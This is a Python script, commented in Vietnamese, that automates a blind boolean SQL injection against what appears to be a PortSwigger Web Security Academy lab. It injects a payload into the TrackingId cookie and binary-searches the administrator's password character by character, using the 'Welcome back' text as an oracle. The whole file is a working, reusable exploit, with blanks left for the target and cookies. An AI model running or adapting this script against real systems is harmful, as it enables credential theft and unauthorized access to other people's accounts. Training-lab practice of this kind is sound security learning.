import requests
from termcolor import colored

alphanumeric = '0123456789abcdefghijklmnopqrstuvwxyz'
#target tự điền
target = "https://0a5b00ae0381ef4a81a4e3e6007700f9.web-security-academy.net/"
success_indicator = "Welcome back"
password = ""
password_length = 20 #password length cũng tự điền

print(colored("[i] Trích xuất mật khẩu (Binary Search):", "blue"))


def is_greater_than(position, char):
    payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')>'{char}"
    
    headers = { #cookie trackingid và session tự điền
        "Cookie": f"TrackingId=S7ZJnmWxEBEFmZU7{payload}; session=u06T3yD3vGgSwjb74H7y3ACWvhOZtfNc"
    }

    response = requests.get(target, headers=headers)
    return success_indicator in response.text


def find_char_at_position(position):
    low = 0
    high = len(alphanumeric) - 1

    while low < high:
        mid = (low + high) // 2
        mid_char = alphanumeric[mid]

        print(f"[*] Pos {position}: thử > '{mid_char}'")

        if is_greater_than(position, mid_char):
            low = mid + 1
        else:
            high = mid

    return alphanumeric[low]


# ================= MAIN =================
for position in range(1, password_length + 1):
    char = find_char_at_position(position)
    password += char

    print(colored(f"[+] Vị trí {position}: {char} -> {password}", "green"))

print(colored(f"\n[!] Mật khẩu là: {password}", "yellow"))